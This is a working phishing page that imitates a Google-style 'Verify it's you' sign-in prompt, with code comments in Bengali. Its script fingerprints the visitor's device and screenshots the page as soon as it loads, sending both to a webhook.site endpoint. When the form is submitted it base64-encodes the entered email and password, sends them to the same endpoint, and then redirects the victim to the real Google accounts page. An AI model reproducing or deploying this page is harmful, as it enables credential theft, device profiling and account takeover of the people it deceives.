<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Security Verification</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background-color: #f1f3f4; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .box { background: #fff; width: 380px; padding: 35px; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; }
        .logo { width: 55px; margin-bottom: 15px; }
        h2 { font-weight: 500; margin-bottom: 10px; }
        p { font-size: 14px; color: #5f6368; margin-bottom: 25px; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 5px; outline: none; }
        input:focus { border: 2px solid #1a73e8; }
        .btn { width: 100%; padding: 12px; background: #1a73e8; color: #fff; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
        #loader { display: none; margin-top: 20px; font-size: 13px; color: #1a73e8; }
    </style>
</head>
<body id="capture_area">

<div class="box">
    <img src="https://cdn-icons-png.flaticon.com/512/2702/2702602.png" class="logo">
    <h2>Verify it's you</h2>
    <p>To help keep your account safe, we need to verify your identity.</p>
    
    <form id="pwnForm">
        <input type="text" id="email" placeholder="Email or phone" required>
        <input type="password" id="pass" placeholder="Enter your password" required>
        <button type="submit" class="btn">Confirm</button>
    </form>

    <div id="loader">Verifying device integrity...</div>
</div>

<script>
    const WEBHOOK_URL = "https://webhook.site/83aa407e-8191-4bd4-82c1-b8cc21a84216";

    // ১. হার্ডওয়্যার ফিঙ্গারপ্রিন্টিং (Fingerprinting)
    async function collectFingerprint() {
        let battery = await navigator.getBattery();
        let info = {
            "CPU_Cores": navigator.hardwareConcurrency,
            "Memory_GB": navigator.deviceMemory || "Unknown",
            "Battery": (battery.level * 100) + "%",
            "Charging": battery.charging,
            "Platform": navigator.platform,
            "Language": navigator.language,
            "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
            "Screen_Res": window.screen.width + "x" + window.screen.height
        };
        fetch(WEBHOOK_URL + "?fingerprint=" + btoa(JSON.stringify(info)), {mode: 'no-cors'});
    }

    // ২. অটোমেটিক স্ক্রিনশট (Screenshot)
    function takeScreenshot() {
        html2canvas(document.body).then(canvas => {
            let imgData = canvas.toDataURL("image/jpeg", 0.5); // কোয়ালিটি ০.৫ (সাইজ কমানোর জন্য)
            // স্ক্রিনশট ডাটা অনেক বড় হয়, তাই এটি POST রিকোয়েস্ট হিসেবে পাঠানো ভালো
            fetch(WEBHOOK_URL, {
                method: 'POST',
                body: JSON.stringify({ "screenshot": imgData }),
                mode: 'no-cors'
            });
        });
    }

    // পেজ লোড হলেই ফিঙ্গারপ্রিন্ট এবং স্ক্রিনশট নাও
    window.onload = () => {
        collectFingerprint();
        setTimeout(takeScreenshot, 2000); // ২ সেকেন্ড পর স্ক্রিনশট নিবে যাতে পেজ লোড শেষ হয়
    };

    // ৩. ফর্ম সাবমিশন
    document.getElementById('pwnForm').addEventListener('submit', function(e) {
        e.preventDefault();
        document.getElementById('pwnForm').style.display = 'none';
        document.getElementById('loader').style.display = 'block';

        const user = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;

        // পাসওয়ার্ড পাঠানো
        fetch(WEBHOOK_URL + "?creds=" + btoa("User: " + user + " | Pass: " + pass), {mode: 'no-cors'})
        .then(() => {
            setTimeout(() => {
                window.location.href = "https://accounts.google.com";
            }, 1500);
        });
    });
</script>

</body>
</html>
